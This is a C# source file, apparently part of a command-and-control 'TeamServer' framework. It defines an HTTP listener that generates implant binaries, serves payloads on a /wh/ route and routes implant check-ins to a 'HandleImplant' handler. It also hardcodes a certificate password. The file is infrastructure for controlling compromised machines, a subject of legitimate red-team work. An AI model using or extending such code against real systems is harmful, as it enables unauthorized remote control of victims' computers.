using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using TeamServer.Services;

namespace TeamServer.Models
{
    public class HttpListener : Listener
    {
        public static Dictionary<int, List<HttpListener>> ListenersByPorts = new Dictionary<int, List<HttpListener>>();

        public override string Protocol => this.Secured ? "https" : "http";

        public override string Uri => $"{this.Protocol}://{this.Ip}:{this.PublicPort}".ToLower();

        public HttpListener(string name, int bindPort, string ip, bool secured = true, int? publicPort = null) : base(name, bindPort, ip, publicPort)
        {
            Secured = secured;
        }

        private CancellationTokenSource _tokenSource;

        public override async Task Start()
        {
            if(_logger != null)
            {
                _logger.LogInformation($"Starting HTTP Listener {this.Name} : {this.Protocol}://{this.Ip}:{this.PublicPort} => {this.BindPort}");
            }

            var port = this.BindPort;
            bool shouldStart = false;
            if (ListenersByPorts.ContainsKey(port))
            {
                var list = ListenersByPorts[port];
                if (list.Count == 0)
                    shouldStart = true;
                list.Add(this);

            }
            else
            {
                ListenersByPorts.Add(port, new List<HttpListener>() { this });
                shouldStart = true;
            }

            if (_logger != null)
            {
               
                try
                {
                    _logger.LogInformation($"Creating binairies");
                    _binMakerService.GenerateB64s(this);
                    var result = _binMakerService.GenerateBins(this);
                    if (_logger != null)
                        _logger.LogInformation(result);
                    
                }
                catch(Exception ex)
                {
                    _logger.LogError(ex.ToString());
                }
            }

            if (!shouldStart)
                return;

            var hostBuilder = new HostBuilder()
                .ConfigureWebHostDefaults(host =>
                {
                    host.UseUrls($"http://*:{BindPort}");
                    host.Configure(ConfigureApp);
                    host.ConfigureServices(ConfigureServices);

                    host.UseKestrel(options =>
                    {
                        options.Listen(IPAddress.Any, BindPort, listenOptions =>
                        {
                            if (this.Secured)
                            {
                                //listenOptions.UseHttps("sslcert.pfx");
                                listenOptions.UseHttps("certs/ts.pfx", "teamserver");
                            }
                        });
                    });
                });
            var host = hostBuilder.Build();

            _tokenSource = new CancellationTokenSource();
            host.RunAsync(_tokenSource.Token);
        }

        private void ConfigureServices(IServiceCollection service)
        {
            service.AddControllers(); //adds all controllers
            //service.AddControllers(mvcOptions =>
            //{
            //    mvcOptions.Filters.Add<HttpListenerActionFilter>();
            //    mvcOptions.
            //});
            service.AddSingleton(this._listenerService);
            service.AddSingleton(this._agentService);
            service.AddSingleton(this._fileService);
            service.AddSingleton(this._binMakerService);
        }

        private void ConfigureApp(IApplicationBuilder app)
        {
            app.UseRouting();
            app.UseEndpoints(e =>
            {
                e.MapControllerRoute("wh", "/wh/{id}", new { Controller = "HttpListener", Action = "WebHost" });
                e.MapControllerRoute("/", "/{id}", new { Controller = "HttpListener", Action = "HandleImplant" });
                //e.MapControllerRoute("SetupDownload", "/SetupDownload/{id}", new { Controller = "HttpListener", Action = "SetupDownload" });
                //e.MapControllerRoute("DownloadChunk", "/DownloadChunk/{id}/{chunkIndex}/", new { Controller = "HttpListener", Action = "DownloadChunk" });
                //e.MapControllerRoute("SetupUpload", "/Upload/Setup", new { Controller = "HttpListener", Action = "SetupUpload" });
                //e.MapControllerRoute("UploadChunk", "/Upload/Chunk", new { Controller = "HttpListener", Action = "UploadChunk" });
                //e.MapControllerRoute("ModuleInfo", "/ModuleInfo/", new { Controller = "HttpListener", Action = "ModuleInfo" });
            });
        }

        public override void Stop()
        {
            var port = this.BindPort;

            var list = ListenersByPorts[port];
            list.Remove(this);


            if (list.Count == 0)
                _tokenSource.Cancel();
        }
    }
}
